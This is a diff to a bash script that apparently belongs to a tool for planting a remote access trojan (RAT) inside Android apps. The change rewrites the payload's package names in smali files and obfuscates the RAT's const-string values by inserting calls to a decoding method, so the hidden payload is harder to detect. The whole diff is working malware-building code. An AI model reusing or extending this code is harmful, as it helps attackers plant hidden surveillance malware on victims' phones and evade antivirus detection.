@@ -245,17 +245,22 @@ if [ $rc == 0 ]; then
   sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali,d.smali,AppBoot.smali} >>$LOG_FILE 2>&1
   rc=$?
 fi
-# obfuscate const-string values in smali files
+echo "done."
+if [ $rc != 0 ]; then
+  echo "[!] Failed to fix RAT smali files"
+  cleanup
+  exit $rc
+fi
+
+echo -n "[*] Obfuscating const-string values in RAT smali files..."
 cat >$MY_PATH/obfuscate.method <<EOL
 
     invoke-static {###REG###}, L###CLASS###;->a(Ljava/lang/String;)Ljava/lang/String;
 
     move-result-object ###REG###
 EOL
-if [ $rc == 0 ]; then
-  sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali} >>$LOG_FILE 2>&1
-  rc=$?
-fi
+sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali} >>$LOG_FILE 2>&1
+rc=$?
 if [ $rc == 0 ]; then
   grep "const-string" $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali} |while read -r line; do
     file=`echo $line |awk -F ": " '{ print $1 }'`
@@ -270,34 +275,34 @@ if [ $rc == 0 ]; then
     sed -i 's%'"$target"'%'"$replacement"'%' $file >>$LOG_FILE 2>&1
     rc=$?
     if [ $rc != 0 ]; then
-      touch $MY_PATH/fixing.error
+      touch $MY_PATH/obfuscate.error
       break
     fi
     sed -i '\|'"$replacement"'|r '"$MY_PATH"'/obfuscate.method' $file >>$LOG_FILE 2>&1
     rc=$?
     if [ $rc != 0 ]; then
-      touch $MY_PATH/fixing.error
+      touch $MY_PATH/obfuscate.error
       break
     fi
     sed -i 's/###REG###/'"$reg"'/' $file >>$LOG_FILE 2>&1
     rc=$?
     if [ $rc != 0 ]; then
-      touch $MY_PATH/fixing.error
+      touch $MY_PATH/obfuscate.error
       break
     fi
   done
-  if [ ! -f $MY_PATH/fixing.error ]; then
+  if [ ! -f $MY_PATH/obfuscate.error ]; then
     class="$payload_tld/$payload_primary_dir/$payload_sub_dir/d"
     sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali}
     rc=$?
   else
-    rm -v $MY_PATH/fixing.error >>$LOG_FILE 2>&1
+    rm -v $MY_PATH/obfuscate.error >>$LOG_FILE 2>&1
     rc=1
   fi
 fi
 echo "done."
 if [ $rc != 0 ]; then
-  echo "[!] Failed to fix RAT smali files"
+  echo "[!] Failed to obfuscate const-string values in RAT smali files"
   cleanup
   exit $rc
 fi
